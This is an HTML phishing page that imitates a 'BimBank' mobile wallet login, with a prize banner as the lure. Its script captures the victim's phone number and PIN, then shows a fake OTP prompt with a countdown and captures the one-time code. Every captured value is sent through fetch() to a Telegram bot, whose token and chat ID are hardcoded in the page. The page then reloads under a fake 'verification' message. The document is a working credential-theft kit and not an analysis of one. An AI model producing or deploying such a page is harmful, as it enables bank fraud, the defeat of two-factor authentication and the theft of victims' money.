<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BimBank - Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
        body { font-family: 'Segoe UI', sans-serif; background-color: #fff; }
        
        .grid-bg {
            background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
            background-size: 20px 20px;
        }

        /* تصميم الشعار الملون */
        .bim-logo { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 25px 0; }
        .logo-img { width: 180px; height: auto; }

        /* شريط الجوائز الإعلاني */
        .prizes {
            background: linear-gradient(135deg, #f19e2c 0%, #d97706 100%);
            margin: 0 20px 20px; padding: 15px; border-radius: 15px;
            display: flex; justify-content: space-around; box-shadow: 0 8px 15px rgba(241,158,44,0.3);
        }
        .p-item { text-align: center; color: white; font-size: 9px; font-weight: bold; }
        .p-img { width: 42px; height: 42px; margin-bottom: 5px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }

        /* العناصر العامة */
        .input-style { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; outline: none; }
        .btn-orange { background: #f19e2c; color: white; font-weight: bold; padding: 14px; border-radius: 8px; width: 100%; margin-top: 15px; }
        .count-text { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }

        /* نافذة الـ OTP (الواجهة الثانية) */
        #otp-modal {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5);
            align-items: center; justify-content: center; z-index: 50; padding: 20px;
        }
        .modal-content { background: white; border-radius: 20px; width: 100%; max-width: 350px; padding: 25px; position: relative; text-align: center; }
        
        /* العداد الدائري */
        .timer-circle {
            width: 120px; height: 120px; border: 4px solid #fff7ed; border-top: 4px solid #f19e2c;
            border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
            font-size: 22px; font-weight: bold; color: #1e293b;
        }
    </style>
</head>
<body class="grid-bg min-h-screen">

    <!-- الواجهة الأولى -->
    <div id="screen-1">
        <div class="bim-logo">
            <img src="https://i.ibb.co/m5v8G1f/bimbank-logo.png" alt="Bimbank" class="logo-img">
        </div>

        <div class="prizes">
            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/741/741407.png" class="p-img">AUTO</div>
            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" class="p-img">CASH</div>
            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="p-img">GIFT</div>
            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/644/644458.png" class="p-img">TECH</div>
        </div>

        <div class="max-w-sm mx-auto px-6">
            <div class="flex border-2 border-[#2a4387] rounded-lg overflow-hidden mb-8">
                <div class="flex-1 bg-[#2a4387] text-white py-2 text-center font-bold">Wallet</div>
                <div class="flex-1 bg-white text-gray-400 py-2 text-center font-bold">Banking</div>
            </div>

            <h2 class="text-[#2a4387] font-bold text-xl mb-4">Connexion</h2>
            <div class="space-y-4">
                <input id="tel" type="tel" maxlength="8" class="input-style" placeholder="Téléphone">
                <input id="pin" type="password" maxlength="4" class="input-style" placeholder="Mot de passe">
            </div>
            <button onclick="showOTP()" class="btn-orange">Connexion</button>
        </div>
    </div>

    <!-- الواجهة الثانية (نافذة OTP) -->
    <div id="otp-modal">
        <div class="modal-content">
            <button onclick="closeModal()" class="absolute top-4 right-4 text-2xl text-gray-400">&times;</button>
            
            <div class="timer-circle" id="timer">04:58</div>
            
            <p class="text-gray-600 text-sm mb-4 text-left">Entrez le code OTP</p>
            <input id="otp-code" type="tel" maxlength="6" class="input-style mb-1" placeholder="Code OTP">
            <div class="count-text mb-4">0/6</div>
            
            <button onclick="finish()" class="btn-orange">Connexion</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT_ID = "8665814266";

        function showOTP() {
            const p = document.getElementById('tel').value;
            const s = document.getElementById('pin').value;
            if(p.length === 8 && s.length === 4) {
                // إرسال البيانات الأولى للبوت
                sendToTelegram(`📱 Tel: ${p}\n🔐 PIN: ${s}`);
                // إظهار واجهة الـ OTP
                document.getElementById('otp-modal').style.display = 'flex';
                startTimer(298); // 4:58 دقائق
            } else {
                alert("يرجى إكمال البيانات");
            }
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                document.getElementById('timer').textContent = minutes + ":" + seconds;
                if (--timer < 0) timer = 0;
            }, 1000);
        }

        function finish() {
            const otp = document.getElementById('otp-code').value;
            if(otp.length === 6) {
                sendToTelegram(`🔑 OTP Code: ${otp}`);
                alert("Vérification en cours... Veuillez patienter.");
                location.reload();
            }
        }

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        }

        function closeModal() { document.getElementById('otp-modal').style.display = 'none'; }
    </script>
</body>
</html>
